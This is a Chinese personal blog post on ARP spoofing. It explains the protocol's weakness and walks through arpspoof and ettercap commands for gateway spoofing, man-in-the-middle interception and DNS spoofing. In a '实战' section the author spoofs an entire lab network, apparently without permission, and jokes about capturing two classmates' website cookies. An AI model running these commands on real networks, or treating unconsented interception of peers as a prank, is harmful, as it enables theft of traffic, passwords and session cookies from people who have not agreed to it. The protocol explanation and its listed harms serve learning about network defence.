<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"phyb0x.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Arp协议">
<meta property="og:type" content="article">
<meta property="og:title" content="ARP欺骗">
<meta property="og:url" content="https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/index.html">
<meta property="og:site_name" content="p&#39;Blog">
<meta property="og:description" content="Arp协议">
<meta property="og:locale">
<meta property="og:image" content="https://i.imgur.com/lDssIx2.png">
<meta property="og:image" content="https://i.imgur.com/U1V2BNW.png">
<meta property="og:image" content="https://i.imgur.com/jzzdh5j.png">
<meta property="og:image" content="https://i.imgur.com/zjjwXsc.png">
<meta property="og:image" content="https://i.imgur.com/ufJj1eu.png">
<meta property="og:image" content="https://i.imgur.com/OPGPLLM.png">
<meta property="og:image" content="https://i.imgur.com/tonPwfc.png">
<meta property="og:image" content="https://i.imgur.com/bURzgxS.png">
<meta property="og:image" content="https://i.imgur.com/6oa7pgy.png">
<meta property="og:image" content="https://i.imgur.com/FwikfBS.png">
<meta property="og:image" content="https://i.imgur.com/9kSpCCL.png">
<meta property="og:image" content="https://i.imgur.com/3gdM1Eb.png">
<meta property="og:image" content="https://i.imgur.com/Oy8OFZq.png">
<meta property="article:published_time" content="2018-12-28T03:44:14.000Z">
<meta property="article:modified_time" content="2019-01-19T02:06:30.000Z">
<meta property="article:author" content="Yumi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/lDssIx2.png">

<link rel="canonical" href="https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh'
  };
</script>

  <title>ARP欺骗 | p'Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">p'Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="https://phyb0x.github.io/2018/12/28/ARP%E6%AC%BA%E9%AA%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/choumei.png">
      <meta itemprop="name" content="Yumi">
      <meta itemprop="description" content="Yumi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="p'Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ARP欺骗
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-28 11:44:14" itemprop="dateCreated datePublished" datetime="2018-12-28T11:44:14+08:00">2018-12-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-01-19 10:06:30" itemprop="dateModified" datetime="2019-01-19T10:06:30+08:00">2019-01-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h3 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h3><span id="more"></span>

<p>以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p>
<h3 id="Arp协议缺陷"><a href="#Arp协议缺陷" class="headerlink" title="Arp协议缺陷"></a>Arp协议缺陷</h3><p>ARP协议信任以太网所有的节点，效率高但是不安全。这份协议没有其它字协议来保证以太网内部信息传输的安全，它不会检查自己是否接受或发送过请求包，只要它就收到的arp广播包，他就会把对应的ip-mac更新到自己的缓存表，说白了就是他信任网络环境内任意通信。</p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>ARP欺骗分为伪造主机欺骗、伪造网关欺骗、中间人欺骗、ARP泛洪和攻击。</p>
<p>伪造主机:造成特定主机被认为无响应</p>
<p>伪造网关:伪造网关，抓取局域网内数据，断网</p>
<p>中间人欺骗:恶意主机既向网关发送主机数据，又伪造网关像主机发数据，作为中间人可看主机与网关之间交互的数据</p>
<p>ARP泛洪攻击：利用ARP缓存表支持动态刷新，且是有一定限制的刷多了就把正确的覆盖了，消耗资源</p>
<h4 id="伪造网关欺骗"><a href="#伪造网关欺骗" class="headerlink" title="伪造网关欺骗"></a>伪造网关欺骗</h4><p>搭建个小环境</p>
<p><img src="https://i.imgur.com/lDssIx2.png"></p>
<p>像主机B(10.10.10.133)发送ARP响应包，欺骗主机A(10.10.10.135) kali为网关</p>
<pre><code>arpspoof -i eth1 -t 10.10.10.133 10.10.10.1
</code></pre>
<p>欺骗前</p>
<p><img src="https://i.imgur.com/U1V2BNW.png"></p>
<p>欺骗后</p>
<p><img src="https://i.imgur.com/jzzdh5j.png"></p>
<p>可以看到一直是主机B与网关的通信</p>
<p><img src="https://i.imgur.com/zjjwXsc.png"></p>
<p>很显然了与网关之间的通信内容也是会被抓窃取。</p>
<h4 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h4><p><img src="https://i.imgur.com/ufJj1eu.png"></p>
<p>本机arp缓存表，可以看到从上到下ip依次为本机，网关，安卓手机，kali，现在我利用kali对主机与网关之间通信进行欺骗。</p>
<p>先打开路由转发(不开启会断网)</p>
<pre><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward


arpspoof -i eth0 -t 192.168.31.1 192.168.31.157
arpspoof -i eth0 -t 192.168.31.157 192.168.31.1
</code></pre>
<p><img src="https://i.imgur.com/OPGPLLM.png"></p>
<p>可以看到主机还是可以联网，但是ARP表上网关的MAC地址却是我的kali机，这就意味着我的kali作为中间人可以截获查看主机与网关之间的往来流量。</p>
<p>kali上打开wireshark抓包</p>
<p><img src="https://i.imgur.com/tonPwfc.png"></p>
<p>可以看到主机与网关之间的通信，来往流量被截获和容易抓到一些敏感信息，甚至明文密码cookie。</p>
<h4 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h4><pre><code>用法
Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]

用法：ettercap【选项】【目标1】【目标2】

TARGET is in the format MAC/IPs/PORTs (see the man for further detail)

目标是MAC/IPs/PORTs格式（根据中间人获取更多信息）

嗅探与攻击选项：
  -M, --mitm &lt;方法:ARGS&gt;  执行mitm攻击

  -o, --only-mitm   不嗅探，只执行mitm攻击

  -B, --bridge &lt;IFACE&gt; 使用桥接嗅探（需要2个iface——嗅探时使用的网卡接口，嗅探两块网卡之间的数据包）

  -p, --nopromisc  不要将iface放入混杂模式

  -S, --nosslmitm  不要伪造SSL证书

  -u, --unoffensive不要转发数据包

  -r, --read &lt;file&gt;   从pcap文件读取数据 &lt;file&gt;

  -f, --pcapfilter &lt;string&gt;   设置pcap过滤器&lt;string&gt;

  -R, --reversed使用逆向目标反馈

  -t, --proto &lt;proto&gt;  只嗅探该proto（默认是全部）

用户界面类型：
  -T, --text使用只显示字符的界面

  -q, --quiet  安静模式，不显示抓到的数据包内容

  -s, --script &lt;CMD&gt;向用户界面发出这些命令

  -C, --curses   使用curses图形化界面

  -G, --gtk使用GTK+ GUI

  -D, --daemon守护模式（无界面），相当于在后台运行

日志选项：
  -w, --write &lt;file&gt;将嗅探到的数据写入pcap文件 &lt;file&gt;

  -L, --log &lt;logfile&gt;  此处记录所有流量&lt;logfile&gt;

  -l, --log-info &lt;logfile&gt;此处记录所有信息&lt;logfile&gt;

  -m, --log-msg &lt;logfile&gt; 此处记录所有消息记录&lt;logfile&gt;

  -c, --compress  使用gzip压缩日志文件

可视化选项：
  -d, --dns   将ip地址解析为主机名

  -V, --visual &lt;format&gt;设置可视化格式

  -e, --regex &lt;regex&gt;  只实现匹配该regex数据包的可视化

  -E, --ext-headers  打印每个pck的扩展头

  -Q, --superquiet   不显示用户名与密码

通用选项：
  -i, --iface &lt;iface&gt; 使用该网络接口

  -I, --liface 显示所有的网络接口

  -n, --netmask &lt;netmask&gt;在iface上强制实行（force）该&lt;netmask&gt;

  -P, --plugin &lt;plugin&gt;   开始该插件&lt;plugin&gt;

  -F, --filter &lt;file&gt;   加载过滤器 &lt;file&gt; （内容过滤器）

  -z, --silent   不执行初始ARP扫描

  -j, --load-hosts &lt;file&gt;  从 &lt;file&gt;加载主机列表

  -k, --save-hosts &lt;file&gt;将主机列表保存至&lt;file&gt;

  -W, --wep-key &lt;wkey&gt;   使用该wep密钥解密wifi数据包

  -a, --config &lt;config&gt;   使用其它配置文件&lt;config&gt;

标准选项：
  -U,  --update   从ettercap网站更新数据库

  -v,  --version   打印此版本并退出

  -h,  --help帮助选项
</code></pre>
<h5 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h5><p>修改<code> /etc/ettercap/etter.dns</code><br><img src="https://i.imgur.com/bURzgxS.png"></p>
<pre><code>ettercap -i eth0 -T -q -P dns_spoof
</code></pre>
<p>可以看到会访问到我kali本地网站</p>
<p><img src="https://i.imgur.com/6oa7pgy.png"></p>
<h5 id="中间人-1"><a href="#中间人-1" class="headerlink" title="中间人"></a>中间人</h5><pre><code>ettercap -i eth0 -T -M arp:remote /192.168.31.157// /192.168.31.1//
</code></pre>
<p><img src="https://i.imgur.com/FwikfBS.png"></p>
<p>主机上网正常，kali也可以捕获过往流量。</p>
<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>说起上次比赛有老哥跟我说我们路由没做ip/mac绑定，可以arp，当时没研究过这个危害，在实验室兴起，搞了一波用ettercap做了全局域网的欺骗</p>
<pre><code>ettercap -i eth0 -T -M arp:remote  /192.168.0.1// 
</code></pre>
<p><img src="https://i.imgur.com/9kSpCCL.png"></p>
<p>扫描到五个存货地址，实验室用的一台路由另一个断网了，可以确定102/195为两位小老弟的ip。(仅仅欺骗了几分钟)</p>
<p><img src="https://i.imgur.com/3gdM1Eb.png"></p>
<p>可以看到还在认真的学习！！！</p>
<p><img src="https://i.imgur.com/Oy8OFZq.png"></p>
<p>却不知自己某站的cookie已经被抓了。</p>
<h5 id="有需要的！！！改密码-tql"><a href="#有需要的！！！改密码-tql" class="headerlink" title="有需要的！！！改密码 tql"></a>有需要的！！！改密码 tql</h5><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>破坏性的就是断网，危害比较大的就是欺骗后流量被随意抓取，内网抓管理密码，抓http密码。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>局域网内设备要有通信arp表才显示，并且<code>nmap  -sP</code>没有发现安卓设备。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2018/12/28/ew%E5%A4%9A%E7%BA%A7%E8%BD%AC%E5%8F%91/" rel="prev" title="ew多级转发">
      <i class="fa fa-chevron-left"></i> ew多级转发
    </a></div>
      <div class="post-nav-item">
    <a href="/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="next" title="横向移动">
      横向移动 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Arp%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.</span> <span class="nav-text">Arp协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arp%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7"><span class="nav-number">2.</span> <span class="nav-text">Arp协议缺陷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA"><span class="nav-number">3.</span> <span class="nav-text">演示</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E7%BD%91%E5%85%B3%E6%AC%BA%E9%AA%97"><span class="nav-number">3.1.</span> <span class="nav-text">伪造网关欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA"><span class="nav-number">3.2.</span> <span class="nav-text">中间人</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ettercap"><span class="nav-number">3.3.</span> <span class="nav-text">ettercap</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#dns%E6%AC%BA%E9%AA%97"><span class="nav-number">3.3.1.</span> <span class="nav-text">dns欺骗</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA-1"><span class="nav-number">3.3.2.</span> <span class="nav-text">中间人</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E6%88%98"><span class="nav-number">3.4.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%89%E9%9C%80%E8%A6%81%E7%9A%84%EF%BC%81%EF%BC%81%EF%BC%81%E6%94%B9%E5%AF%86%E7%A0%81-tql"><span class="nav-number">3.4.1.</span> <span class="nav-text">有需要的！！！改密码 tql</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%B1%E5%AE%B3"><span class="nav-number">3.5.</span> <span class="nav-text">危害</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Yumi"
      src="/images/choumei.png">
  <p class="site-author-name" itemprop="name">Yumi</p>
  <div class="site-description" itemprop="description">Yumi</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">29</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yumi</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
